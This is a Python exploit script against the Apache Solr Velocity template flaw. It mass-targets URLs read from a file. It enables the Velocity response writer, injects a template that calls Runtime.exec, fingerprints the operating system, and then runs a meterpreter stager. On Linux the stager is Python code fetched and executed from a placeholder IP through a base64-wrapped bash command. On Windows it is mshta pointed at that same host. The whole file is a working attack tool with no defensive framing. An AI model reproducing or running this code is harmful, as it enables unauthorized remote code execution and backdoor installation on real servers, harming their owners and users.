import requests
import threadpool
import urllib3
import json
import urllib
import base64

urllib3.disable_warnings()
header = {
    "Proxy-Connection": "keep-alive",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/json",
    "Referer": "https://google.com",
    "Connection": "close",
}
post_data = """
{
    "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
    }
}
"""

def linux_command(cmd):
    bse64_cmd = str(base64.b64encode(bytes(cmd, encoding="utf-8")), encoding="utf-8")
    return "bash -c {echo,%s}|{base64,-d}|{bash,-i}" % bse64_cmd

def get_os_payload(url, cmd):
    check = urllib.parse.quote(linux_command("uname;id"))
    payload = url + "/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + check + "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    try:
        os = requests.get(payload, headers=header, verify=False, timeout=30).text
        if "Linux" in os:
            print("[Linux]：", end="")
            return payload.replace(check, urllib.parse.quote(linux_command(cmd[0])))
        else:
            os = requests.get(payload.replace(check, urllib.parse.quote("cmd.exe /c ver")), headers=header, verify=False, timeout=30).text
            if "Windows" in os:
                print("[Windows]：", end="")
                return payload.replace(check, urllib.parse.quote("cmd.exe /c " + cmd[1]))
            return
    except:
        return

def exp(u):
    # meterpreter
    lin_cmd = r'''python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://xxx.xxx.xxx.xxx/bLJUe25Mv');exec(r.read());"'''
    win_cmd = "mshta http://xxx.xxx.xxx.xxx/Rg4KT"
    command = [lin_cmd, win_cmd]
    try:
        req1 = requests.get(u + "/solr/admin/cores?wt=json&indexInfo=false", headers=header, verify=False, timeout=30)
        if '"status":' in req1.text:
            url = u + "/solr/" + list(json.loads(req1.text)["status"])[0]
            req2 = requests.post(url + "/config", data=post_data, headers=header, verify=False, timeout=30)
            if '"responseHeader":' in req2.text:
                payload = get_os_payload(url, command)
                if payload:
                    print(u)
                    requests.get(payload, headers=header, verify=False, timeout=15)
    except:
        return

def multithreading(funcname, params=[], filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], "url.txt", 5)      # exp的函数名，exp的多个参数值，读取的文件，线程数

if __name__ == "__main__":
    main()